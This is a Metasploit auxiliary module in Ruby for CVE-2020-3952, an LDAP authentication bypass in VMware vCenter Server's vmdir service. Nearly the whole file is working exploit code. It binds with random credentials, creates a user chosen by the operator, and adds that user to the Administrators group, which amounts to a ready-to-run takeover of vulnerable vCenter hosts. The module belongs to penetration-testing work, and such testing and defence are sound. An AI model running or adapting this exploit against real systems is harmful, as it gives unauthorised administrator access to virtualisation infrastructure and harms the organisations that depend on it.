##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::LDAP
  include Msf::OptionalSession::LDAP
  include Msf::Exploit::Remote::CheckModule

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'VMware vCenter Server vmdir Authentication Bypass',
        'Description' => %q{
          This module bypasses LDAP authentication in VMware vCenter Server's
          vmdir service to add an arbitrary administrator user. Version 6.7
          prior to the 6.7U3f update is vulnerable, only if upgraded from a
          previous release line, such as 6.0 or 6.5.
          Note that it is also possible to provide a bind username and password
          to authenticate if the target is not vulnerable. It will add an
          arbitrary administrator user the same way.
        },
        'Author' => [
          'Hynek Petrak', # Discovery
          'JJ Lehmann', # Analysis and PoC
          'Ofri Ziv', # Analysis and PoC
          'wvu' # Module
        ],
        'References' => [
          ['CVE', '2020-3952'],
          ['URL', 'https://www.guardicore.com/2020/04/pwning-vmware-vcenter-cve-2020-3952/'],
          ['URL', 'https://www.vmware.com/security/advisories/VMSA-2020-0006.html'],
          ['URL', 'https://github.com/HynekPetrak/HynekPetrak/blob/master/take_over_vcenter_670.md']
        ],
        'DisclosureDate' => '2020-04-09', # Vendor advisory
        'License' => MSF_LICENSE,
        'Actions' => [
          ['Add', { 'Description' => 'Add an admin user' }]
        ],
        'DefaultAction' => 'Add',
        'DefaultOptions' => {
          'SSL' => true,
          'RPORT' => 636, # SSL/TLS
          'CheckModule' => 'auxiliary/gather/vmware_vcenter_vmdir_ldap'
        },
        'Notes' => {
          'Stability' => [SERVICE_RESOURCE_LOSS],
          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES],
          'Reliability' => []
        }
      )
    )

    register_options([
      OptString.new('BASE_DN', [false, 'LDAP base DN if you already have it']),
      OptString.new('NEW_USERNAME', [true, 'Username of admin user to add']),
      OptString.new('NEW_PASSWORD', [true, 'Password of admin user to add'])
    ])
  end

  def new_username
    datastore['NEW_USERNAME']
  end

  def new_password
    datastore['NEW_PASSWORD']
  end

  def base_dn
    @base_dn ||= 'dc=vsphere,dc=local'
  end

  def user_dn
    "cn=#{new_username},cn=Users,#{base_dn}"
  end

  def group_dn
    "cn=Administrators,cn=Builtin,#{base_dn}"
  end

  def run
    unless new_username && new_password
      print_error('Please set the NEW_USERNAME and NEW_PASSWORD options to proceed')
      return
    end

    # NOTE: check is provided by auxiliary/gather/vmware_vcenter_vmdir_ldap
    checkcode = check

    return unless checkcode == Exploit::CheckCode::Vulnerable

    if (@base_dn = datastore['BASE_DN'])
      print_status("User-specified base DN: #{base_dn}")
    else
      # HACK: We stashed the detected base DN in the CheckCode's reason
      @base_dn = checkcode.reason
    end

    ldap_connect do |ldap|
      print_status("Bypassing LDAP auth in vmdir service at #{ldap.peerinfo}")
      auth_bypass(ldap)

      print_status("Adding admin user #{new_username} with password #{new_password}")

      unless add_admin(ldap)
        print_error("Failed to add admin user #{new_username}")
      end
    end
  rescue Net::LDAP::Error => e
    print_error("#{e.class}: #{e.message}")
  end

  # This will always return false, since the creds are invalid
  def auth_bypass(ldap)
    # when datastore['BIND_DN'] has been provided in options,
    # ldap_connect has already made a bind for us.
    return if datastore['LDAPUsername'] && ldap.bind

    ldap.bind(
      method: :simple,
      username: Rex::Text.rand_text_alphanumeric(8..42),
      password: Rex::Text.rand_text_alphanumeric(8..42)
    )
  end

  def add_admin(ldap)
    user_info = {
      'objectClass' => %w[top person organizationalPerson user],
      'cn' => new_username,
      'sn' => 'vsphere.local',
      'givenName' => new_username,
      'sAMAccountName' => new_username,
      'userPrincipalName' => "#{new_username}@VSPHERE.LOCAL",
      'uid' => new_username,
      'userPassword' => new_password
    }

    # Add our new user
    unless ldap.add(dn: user_dn, attributes: user_info)
      res = ldap.get_operation_result

      case res.code
      when Net::LDAP::ResultCodeInsufficientAccessRights
        print_error('Failed to bypass LDAP auth in vmdir service')
      when Net::LDAP::ResultCodeEntryAlreadyExists
        print_error("User #{new_username} already exists")
      when Net::LDAP::ResultCodeConstraintViolation
        print_error("Password #{new_password} does not meet policy requirements")
      else
        print_error("#{res.message}: #{res.error_message}")
      end

      return false
    end

    print_good("Added user #{new_username}, so auth bypass was successful!")

    # Add our user to the admin group
    unless ldap.add_attribute(group_dn, 'member', user_dn)
      res = ldap.get_operation_result

      if res.code == Net::LDAP::ResultCodeAttributeOrValueExists
        print_error("User #{new_username} is already an admin")
      else
        print_error("#{res.message}: #{res.error_message}")
      end

      return false
    end

    print_good("Added user #{new_username} to admin group")

    true
  end

end
